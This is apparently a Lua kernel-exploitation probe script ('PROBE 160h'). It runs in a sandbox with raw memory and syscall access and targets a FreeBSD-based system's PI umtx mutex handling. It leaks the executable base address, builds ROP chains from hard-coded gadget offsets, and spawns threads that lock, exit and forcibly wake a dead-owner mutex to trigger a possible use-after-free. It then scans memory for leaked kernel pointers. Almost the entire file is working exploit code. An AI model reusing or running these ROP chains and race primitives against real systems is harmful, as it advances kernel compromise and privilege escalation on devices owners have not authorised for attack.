-- CRASH_CLASS: MODERATE
-- PROBE 160h: Dead-owner PI mutex rescue via MTX_WAKE
--
-- 160g confirmed: LOCK on dead-owner mutex blocks forever on 14.10.
-- Kernel doesn't detect dead owner, doesn't clear m_owner on thr_exit.
--
-- Attack: child A LOCKs then thr_exits (dead TID in m_owner).
-- Main calls LOCK → blocks (dead owner). Child B (spawned before main blocks):
--   nanosleep(100ms) → write 0 to m_owner → MTX_WAKE(18) on mutex
-- Main wakes. Kernel's do_lock_pi retries, sees m_owner=0, CAS succeeds.
-- BUT the PI chain state from the dead owner may be inconsistent → possible UAF.
--
-- 10 rounds, check for kernel pointer leaks and unexpected returns.

print("=== PROBE 160h: DEAD-OWNER PI RESCUE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa = syscall.syscall_address

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret      = 0x42,
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    mov_w    = 0x92C67,
    jmp_loop = 0x15481,
}

local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)

-- Ignore all catchable signals
local sc_sigaction = mk(416)
local act = memory.alloc(0x40)
for off = 0, 0x3C, 4 do wd(N(act) + off, 0) end
for sig = 1, 31 do
    if sig ~= 9 then
        wq(N(act), uint64(1)); wd(N(act) + 8, 0)
        pcall(function() sc_sigaction(uint64(sig), act, uint64(0), uint64(0), uint64(0), uint64(0)) end)
    end
end
print("signals ignored")

-- Shared area layout:
-- +0x000: MUTEX (dword, PI mutex m_owner)
-- +0x008: (padding for qword writes to MUTEX)
-- +0x010: A_EXIT_STATE (dword, thr_exit writes 1)
-- +0x020: B_SENTINEL (qword, child B writes when done)
-- +0x030: B_WAKE_RET (qword, MTX_WAKE return value)
-- +0x040: MAIN_LOCK_RET (qword, for scanning)
-- +0x050: SCAN area (64 bytes)
local shared = memory.alloc(0x200)
local MUTEX        = N(shared)
local A_EXIT_STATE = N(shared) + 0x10
local B_SENTINEL   = N(shared) + 0x20
local B_WAKE_RET   = N(shared) + 0x30

-- Timespecs
local ts_100ms = memory.alloc(16)
wq(N(ts_100ms), uint64(0))
wq(N(ts_100ms) + 8, uint64(100000000))

-- Stacks: A uses 0x0000-0x3FFF, B uses 0x4000-0x7FFF
local stk = memory.alloc(0x10000)
local ctx = memory.alloc(0x500)
local tid_buf = memory.alloc(8)

local function cp(base, p, val)
    wq(base + p, val)
    return p + 8
end

local function spawn(chain_base)
    local BC = N(ctx)
    for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
    wd(BC + 0x108, 0x480)
    wd(BC + 0xD0, 0)
    wd(BC + 0x110, 0x10000)
    wd(BC + 0xC0, 0x43)
    wd(BC + 0x100, 0x3B)
    wd(BC + 0xE0, rip_lo)
    wd(BC + 0xE4, rip_hi)
    local rsp_lo = chain_base % 0x100000000
    local rsp_hi = math.floor(chain_base / 0x100000000)
    wd(BC + 0xF8, rsp_lo)
    wd(BC + 0xFC, rsp_hi)
    wq(N(tid_buf), uint64("0x0"))
    local tr = nil
    pcall(function() tr = mk(430)(ctx, tid_buf, uint64(0)) end)
    return tr, rq(N(tid_buf))
end

local sc_umtx = mk(454)

local function check_kptr(addr, len)
    local found = 0
    for off = 0, len - 8, 4 do
        local q = rq(addr + off)
        if q then
            local h = 0
            if type(q) == "table" and q.h then h = q.h end
            if h < 0 then h = h + 0x100000000 end
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR +0x%X: %s ***", off, fmt(q)))
                found = found + 1
            end
        end
    end
    return found
end

local function zero_shared()
    for off = 0, 0x5F, 4 do wd(N(shared) + off, 0) end
end

-- ========== SANITY: child getpid ==========
print("")
print("[0] sanity")
local SAN_RET = N(shared) + 0x50
local SAN_SENT = N(shared) + 0x58
wd(SAN_RET, 0)
wq(SAN_SENT, uint64(0))

local CB = N(stk) + 0x2000
local p = 0
p = cp(CB, p, eaddr(G.pop_rax)); p = cp(CB, p, uint64(20))
p = cp(CB, p, sa)
p = cp(CB, p, eaddr(G.pop_rdi)); p = cp(CB, p, uint64(string.format("0x%X", SAN_RET)))
p = cp(CB, p, eaddr(G.mov_w))
p = cp(CB, p, eaddr(G.pop_rdi)); p = cp(CB, p, uint64(string.format("0x%X", SAN_SENT)))
p = cp(CB, p, eaddr(G.pop_rax)); p = cp(CB, p, uint64("0xDEAD"))
p = cp(CB, p, eaddr(G.mov_w))
p = cp(CB, p, eaddr(G.jmp_loop))

spawn(CB)
for i = 1, 50000 do
    if N(rq(SAN_SENT) or 0) ~= 0 then break end
    if i % 1000 == 0 then native.fcall_with_rax(stub, 20) end
end
local gpid = rq(SAN_RET)
print(string.format("  child_pid=%s (expect 0x%X)", fmt(gpid), pid))
if gpid == nil or N(gpid) ~= pid then
    print("  ABORT: child ROP broken")
    return
end
print("  OK")

-- ========== MAIN LOOP: dead-owner rescue ==========
print("")
print("[MAIN] Dead-owner rescue (10 rounds)")
print("")

local total_kptr = 0
local total_anomaly = 0

for round = 1, 10 do
    if not alive() then
        print(string.format("  R%d DIED!", round))
        break
    end

    zero_shared()

    -- Step 1: Child A LOCKs then thr_exits
    local CA = N(stk) + 0x2000
    p = 0
    -- LOCK
    p = cp(CA, p, eaddr(G.pop_rax)); p = cp(CA, p, uint64(454))
    p = cp(CA, p, eaddr(G.pop_rdi)); p = cp(CA, p, uint64(string.format("0x%X", MUTEX)))
    p = cp(CA, p, eaddr(G.pop_rsi)); p = cp(CA, p, uint64(5))
    p = cp(CA, p, sa)
    -- thr_exit(A_EXIT_STATE)
    p = cp(CA, p, eaddr(G.pop_rax)); p = cp(CA, p, uint64(431))
    p = cp(CA, p, eaddr(G.pop_rdi)); p = cp(CA, p, uint64(string.format("0x%X", A_EXIT_STATE)))
    p = cp(CA, p, sa)

    local tra = spawn(CA)

    -- Wait for A to exit
    for i = 1, 100000 do
        if (rd(A_EXIT_STATE) or 0) ~= 0 then break end
        if i % 1000 == 0 then native.fcall_with_rax(stub, 20) end
    end

    local a_exited = (rd(A_EXIT_STATE) or 0) ~= 0
    local m_dead = rd(MUTEX) or 0

    if not a_exited then
        print(string.format("  R%d: child A didn't exit, skip", round))
        wd(MUTEX, 0)
        -- Try to prevent next round from having stale state
        for i = 1, 10000 do native.fcall_with_rax(stub, 20) end
        wd(MUTEX, 0)
    else
        -- Step 2: Spawn Child B (rescuer) BEFORE main blocks
        -- B: nanosleep(100ms) → write 0 to MUTEX → MTX_WAKE(18) → sentinel
        local CBB = N(stk) + 0x6000
        p = 0
        -- nanosleep(100ms)
        p = cp(CBB, p, eaddr(G.pop_rax)); p = cp(CBB, p, uint64(240))
        p = cp(CBB, p, eaddr(G.pop_rdi)); p = cp(CBB, p, uint64(string.format("0x%X", N(ts_100ms))))
        p = cp(CBB, p, eaddr(G.pop_rsi)); p = cp(CBB, p, uint64(0))
        p = cp(CBB, p, sa)
        -- write 0 to MUTEX (clears m_owner)
        p = cp(CBB, p, eaddr(G.pop_rdi)); p = cp(CBB, p, uint64(string.format("0x%X", MUTEX)))
        p = cp(CBB, p, eaddr(G.pop_rax)); p = cp(CBB, p, uint64(0))
        p = cp(CBB, p, eaddr(G.mov_w))
        -- MTX_WAKE(18) on MUTEX
        p = cp(CBB, p, eaddr(G.pop_rax)); p = cp(CBB, p, uint64(454))
        p = cp(CBB, p, eaddr(G.pop_rdi)); p = cp(CBB, p, uint64(string.format("0x%X", MUTEX)))
        p = cp(CBB, p, eaddr(G.pop_rsi)); p = cp(CBB, p, uint64(18))
        p = cp(CBB, p, sa)
        -- store MTX_WAKE return value
        p = cp(CBB, p, eaddr(G.pop_rdi)); p = cp(CBB, p, uint64(string.format("0x%X", B_WAKE_RET)))
        p = cp(CBB, p, eaddr(G.mov_w))
        -- sentinel
        p = cp(CBB, p, eaddr(G.pop_rdi)); p = cp(CBB, p, uint64(string.format("0x%X", B_SENTINEL)))
        p = cp(CBB, p, eaddr(G.pop_rax)); p = cp(CBB, p, uint64("0xBBBB"))
        p = cp(CBB, p, eaddr(G.mov_w))
        -- thr_exit to clean up
        local B_EXIT = N(shared) + 0x60
        wd(B_EXIT, 0)
        p = cp(CBB, p, eaddr(G.pop_rax)); p = cp(CBB, p, uint64(431))
        p = cp(CBB, p, eaddr(G.pop_rdi)); p = cp(CBB, p, uint64(string.format("0x%X", B_EXIT)))
        p = cp(CBB, p, sa)

        local trb = spawn(CBB)

        -- Step 3: Main calls LOCK on dead-owner mutex (BLOCKS)
        -- Child B will rescue us after ~100ms
        local mret = nil
        local mok = pcall(function()
            mret = sc_umtx(uint64(MUTEX), uint64(5), uint64(0), uint64(0), uint64(0))
        end)

        -- If we reach here, we were rescued!
        local m_after = rd(MUTEX) or 0
        local b_sent = rq(B_SENTINEL)
        local b_wake = rq(B_WAKE_RET)
        local kp = check_kptr(N(shared), 0x70)
        total_kptr = total_kptr + kp

        local anomaly = false
        if not mok then anomaly = true end
        if mret and N(mret) ~= 0 then anomaly = true end
        if kp > 0 then anomaly = true end

        if anomaly then
            total_anomaly = total_anomaly + 1
            print(string.format("  R%d: *** ANOMALY *** dead_tid=0x%X mok=%s mret=%s m_after=0x%X wake=%s kptr=%d",
                round, m_dead, tostring(mok), fmt(mret), m_after, fmt(b_wake), kp))
        else
            print(string.format("  R%d: ok dead_tid=0x%X mret=%s m_after=0x%X wake=%s b=%s",
                round, m_dead, fmt(mret), m_after, fmt(b_wake), fmt(b_sent)))
        end

        -- Wait for B to exit
        for i = 1, 50000 do
            if (rd(B_EXIT) or 0) ~= 0 then break end
            if i % 1000 == 0 then native.fcall_with_rax(stub, 20) end
        end

        -- Unlock: clear mutex for next round
        wd(MUTEX, 0)
    end
end

print("")
print(string.format("TOTAL: anomalies=%d kptr=%d", total_anomaly, total_kptr))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 160h COMPLETE ===")
